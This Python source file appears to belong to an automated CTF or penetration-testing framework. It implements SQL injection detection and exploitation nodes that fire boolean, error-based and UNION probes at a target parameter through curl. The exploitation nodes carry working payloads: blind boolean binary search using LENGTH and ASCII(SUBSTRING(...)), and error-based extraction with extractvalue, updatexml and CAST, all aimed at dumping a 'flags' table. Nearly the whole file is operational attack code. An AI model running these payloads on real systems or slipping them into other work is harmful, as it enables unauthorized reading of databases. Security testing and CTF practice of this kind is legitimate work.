"""SQL Injection detection and exploitation trees (W-SQLi-Detect & W-SQLi-Exploit).

Implements the SQLi decision trees from detections.md:
- W-S.1: Check if parameter is reflected
- W-S.2: Boolean-based probes
- W-S.3: Error-based signatures
- W-S.4: Union-based hints
"""
from typing import Dict, Any, Optional, List
import logging
import re
import time

from lattice_mind.core.nodes import DecisionNode
from lattice_mind.core.types import (
    NodeResult, NodeStatus, VulnDescriptor, VulnType
)
from lattice_mind.core.adapter_types import HttpDataKeys
from lattice_mind.adapters.curl_adapter import CurlAdapter

logger = logging.getLogger(__name__)


class SQLiDetectReflectionNode(DecisionNode):
    """W-S.1: Check if parameter is reflected in response."""
    
    def __init__(self):
        super().__init__("sqli_detect_reflection", "SQLi: Check Reflection")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Check if parameter is reflected."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(
                status=NodeStatus.FAILURE,
                error="No challenge or target parameter"
            )
        
        # Extract parameter name and endpoint
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing reflection on {endpoint}?{param_name}=TEST")
        
        try:
            # Send benign value
            url = f"{endpoint}?{param_name}=REFLECTION_TEST"
            result = self.curl.run(url, {})
            
            if result.is_error:
                return NodeResult(
                    status=NodeStatus.FAILURE,
                    error=f"HTTP request failed: {result.error}"
                )
            
            body = result.get(HttpDataKeys.BODY, "")
            
            # Check if test value appears in response
            is_reflected = "REFLECTION_TEST" in body
            
            logger.info(f"[sqli] Reflection: {is_reflected}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "is_reflected": is_reflected,
                    "baseline_response": body,
                }
            )
        
        except Exception as e:
            logger.error(f"[sqli] Reflection check failed: {str(e)}")
            return NodeResult(
                status=NodeStatus.FAILURE,
                error=str(e)
            )
    
    def next_node(self, result: NodeResult) -> Optional[str]:
        """Return next node ID for registry-based routing."""
        if result.status == NodeStatus.SUCCESS:
            return "sqli_detect_boolean"
        return None


class SQLiDetectBooleanNode(DecisionNode):
    """W-S.2: Boolean-based SQLi probes."""
    
    def __init__(self):
        super().__init__("sqli_detect_boolean", "SQLi: Boolean Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test boolean-based SQLi."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing boolean-based SQLi")
        
        try:
            # Baseline request
            url_baseline = f"{endpoint}?{param_name}=1"
            result_baseline = self.curl.run(url_baseline, {})
            baseline_body = result_baseline.get(HttpDataKeys.BODY, "")
            baseline_len = len(baseline_body)
            
            # True condition
            url_true = f"{endpoint}?{param_name}=1' AND '1'='1"
            result_true = self.curl.run(url_true, {})
            true_body = result_true.get(HttpDataKeys.BODY, "")
            true_len = len(true_body)
            
            # False condition
            url_false = f"{endpoint}?{param_name}=1' AND '1'='0"
            result_false = self.curl.run(url_false, {})
            false_body = result_false.get(HttpDataKeys.BODY, "")
            false_len = len(false_body)
            
            # Analyze responses
            baseline_hash = hash(baseline_body)
            true_hash = hash(true_body)
            false_hash = hash(false_body)
            
            # If responses differ significantly, likely SQLi
            is_sqli = (true_hash != false_hash) or (true_len != false_len)
            
            if is_sqli:
                self.emit_signal("boolean_sqli_confirmed", confidence_boost=0.70)
            
            logger.info(f"[sqli] Boolean test: {is_sqli}")
            logger.debug(f"[sqli] Baseline len={baseline_len}, True len={true_len}, False len={false_len}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "is_boolean_sqli": is_sqli,
                    "response_diff": true_len != false_len,
                }
            )
        
        except Exception as e:
            logger.error(f"[sqli] Boolean test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[str]:
        """Return next node ID for registry-based routing."""
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_boolean_sqli"):
                return "sqli_exploit_boolean"
            else:
                return "sqli_detect_error"
        return None


class SQLiDetectErrorNode(DecisionNode):
    """W-S.3: Error-based SQLi signatures."""
    
    def __init__(self):
        super().__init__("sqli_detect_error", "SQLi: Error-Based Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test error-based SQLi."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing error-based SQLi")
        
        # Error signatures to look for
        error_patterns = [
            r"SQL syntax",
            r"near '",
            r"sqlite_error",
            r"pg_query",
            r"MySQL",
            r"ORA-\d+",  # Oracle
            r"MSSQL",
            r"syntax error",
        ]
        
        try:
            # Send payload that should cause SQL error
            url = f"{endpoint}?{param_name}=1'"
            result = self.curl.run(url, {})
            body = result.get(HttpDataKeys.BODY, "")
            
            # Check for error signatures
            found_errors = []
            for pattern in error_patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    found_errors.append(pattern)
            
            is_error_sqli = len(found_errors) > 0
            
            if is_error_sqli:
                self.emit_signal("error_sqli_confirmed", confidence_boost=0.85)
            
            logger.info(f"[sqli] Error-based test: {is_error_sqli}")
            if found_errors:
                logger.debug(f"[sqli] Found error signatures: {found_errors}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "is_error_sqli": is_error_sqli,
                    "error_signatures": found_errors,
                }
            )
        
        except Exception as e:
            logger.error(f"[sqli] Error test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[str]:
        """Return next node ID for registry-based routing."""
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_error_sqli"):
                return "sqli_exploit_error"
            else:
                return "sqli_detect_union"
        return None


class SQLiDetectUnionNode(DecisionNode):
    """W-S.4: Union-based SQLi hints."""
    
    def __init__(self):
        super().__init__("sqli_detect_union", "SQLi: Union-Based Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test union-based SQLi."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing union-based SQLi")
        
        try:
            # Try ORDER BY to find column count
            for cols in range(1, 6):
                url = f"{endpoint}?{param_name}=1 ORDER BY {cols}"
                result = self.curl.run(url, {})
                status = result.get("status", 0)
                
                if status == 500:
                    logger.info(f"[sqli] Found column count: {cols - 1}")
                    col_count = cols - 1
                    
                    # Try UNION SELECT with found column count
                    union_payload = f"1 UNION SELECT {','.join(['NULL'] * col_count)}"
                    url_union = f"{endpoint}?{param_name}={union_payload}"
                    result_union = self.curl.run(url_union, {})
                    
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={
                            "is_union_sqli": True,
                            "column_count": col_count,
                        }
                    )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_union_sqli": False}
            )
        
        except Exception as e:
            logger.error(f"[sqli] Union test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


class SQLiExploitBooleanNode(DecisionNode):
    """Exploit boolean-based SQLi to extract data via binary search."""
    
    def __init__(self):
        super().__init__("sqli_exploit_boolean", "SQLi: Extract via Boolean")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Exploit boolean-based SQLi using binary search for character extraction."""
        target_param = context.get("target_param")
        
        if not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="No target parameter")
        
        endpoint = target_param.get("endpoint")
        param_name = target_param.get("name")
        
        logger.info(f"[sqli] Starting boolean blind exploitation on {param_name}")
        
        try:
            # Find flag length first
            flag_length = self._find_flag_length(endpoint, param_name)
            if not flag_length:
                logger.warning("[sqli] Could not determine flag length")
                return NodeResult(status=NodeStatus.FAILURE, error="Flag length detection failed")
            
            logger.info(f"[sqli] Flag length detected: {flag_length}")
            
            # Extract flag character by character
            flag = ""
            for pos in range(1, flag_length + 1):
                char = self._binary_search_char(endpoint, param_name, pos)
                if char:
                    flag += char
                    logger.info(f"[sqli] Extracted so far: {flag}")
                    
                    # Check if we have a complete flag
                    if flag.endswith("}") and "{" in flag:
                        context["flag_found"] = flag
                        self.emit_signal("flag_extracted", confidence_boost=1.0)
                        return NodeResult(
                            status=NodeStatus.SUCCESS,
                            data={"flag": flag, "technique": "boolean_blind"}
                        )
                else:
                    logger.warning(f"[sqli] Failed to extract character at position {pos}")
                    break
            
            # Return partial extraction
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"partial_flag": flag, "technique": "boolean_blind"}
            )
        
        except Exception as e:
            logger.error(f"[sqli] Boolean exploitation failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def _find_flag_length(self, endpoint: str, param: str) -> Optional[int]:
        """Binary search for flag length."""
        low, high = 1, 200
        
        while low < high:
            mid = (low + high + 1) // 2
            # Test if length >= mid
            payload = f"' AND LENGTH((SELECT flag FROM flags LIMIT 1))>={mid}--"
            url = f"{endpoint}?{param}={payload}"
            
            result = self.curl.run(url, {})
            if self._is_true_response(result):
                low = mid
            else:
                high = mid - 1
        
        return low if low > 0 else None
    
    def _binary_search_char(self, endpoint: str, param: str, pos: int) -> Optional[str]:
        """Binary search for character at given position."""
        low, high = 32, 126  # Printable ASCII range
        
        while low < high:
            mid = (low + high) // 2
            # Test if char > mid
            payload = f"' AND ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1))>{mid}--"
            url = f"{endpoint}?{param}={payload}"
            
            result = self.curl.run(url, {})
            if self._is_true_response(result):
                low = mid + 1
            else:
                high = mid
        
        return chr(low) if 32 <= low <= 126 else None
    
    def _is_true_response(self, result) -> bool:
        """Determine if response indicates TRUE condition."""
        # Simple heuristic: TRUE responses typically have more content
        # In real scenarios, would compare against baseline
        body = result.get(HttpDataKeys.BODY, "")
        status = result.get(HttpDataKeys.STATUS_CODE, 0)
        
        # If status is 200 and body is non-empty, likely TRUE
        return status == 200 and len(body) > 100


class SQLiExploitErrorNode(DecisionNode):
    """Exploit error-based SQLi to extract data via error messages."""
    
    def __init__(self):
        super().__init__("sqli_exploit_error", "SQLi: Extract via Errors")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Exploit error-based SQLi using extractvalue/updatexml techniques."""
        target_param = context.get("target_param")
        
        if not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="No target parameter")
        
        endpoint = target_param.get("endpoint")
        param_name = target_param.get("name")
        
        logger.info(f"[sqli] Starting error-based exploitation on {param_name}")
        
        # Try various error-based extraction techniques
        techniques = [
            # MySQL extractvalue
            "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1),0x7e))--",
            # MySQL updatexml
            "' AND updatexml(null,concat(0x7e,(SELECT flag FROM flags LIMIT 1)),null)--",
            # Generic concat to cause error
            "' UNION SELECT 1,flag,3,4,5 FROM flags--",
            # PostgreSQL
            "' AND 1=CAST((SELECT flag FROM flags LIMIT 1) AS INT)--",
        ]
        
        try:
            for payload in techniques:
                url = f"{endpoint}?{param_name}={payload}"
                result = self.curl.run(url, {})
                body = result.get(HttpDataKeys.BODY, "")
                
                # Look for flag pattern in error message or response
                flag_match = re.search(r'flag\{[^}]+\}', body, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(0)
                    logger.info(f"[sqli] Flag extracted via error-based SQLi: {flag}")
                    context["flag_found"] = flag
                    self.emit_signal("flag_extracted", confidence_boost=1.0)
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={"flag": flag, "technique": "error_based"}
                    )
                
                # Also check for partial flag in error messages between delimiters
                delimited_match = re.search(r'~([^~]+)~', body)
                if delimited_match and 'flag{' in delimited_match.group(1).lower():
                    potential_flag = delimited_match.group(1)
                    logger.info(f"[sqli] Potential flag in error: {potential_flag}")
                    context["flag_found"] = potential_flag
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={"flag": potential_flag, "technique": "error_based"}
                    )
            
            logger.warning("[sqli] No flag found via error-based techniques")
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"exploitation": "attempted", "techniques_tried": len(techniques)}
            )
        
        except Exception as e:
            logger.error(f"[sqli] Error-based exploitation failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


# Summary
"""
SQL Injection Detection Trees (W-SQLi)

Detection nodes:
- W-S.1 (SQLiDetectReflectionNode) - Check parameter reflection
- W-S.2 (SQLiDetectBooleanNode) - Boolean-based detection
- W-S.3 (SQLiDetectErrorNode) - Error-based detection
- W-S.4 (SQLiDetectUnionNode) - Union-based detection

Exploitation nodes:
- SQLiExploitBooleanNode - Extract via boolean logic
- SQLiExploitErrorNode - Extract via error messages

Used by web reconnaissance tree to test ID-like parameters.
"""
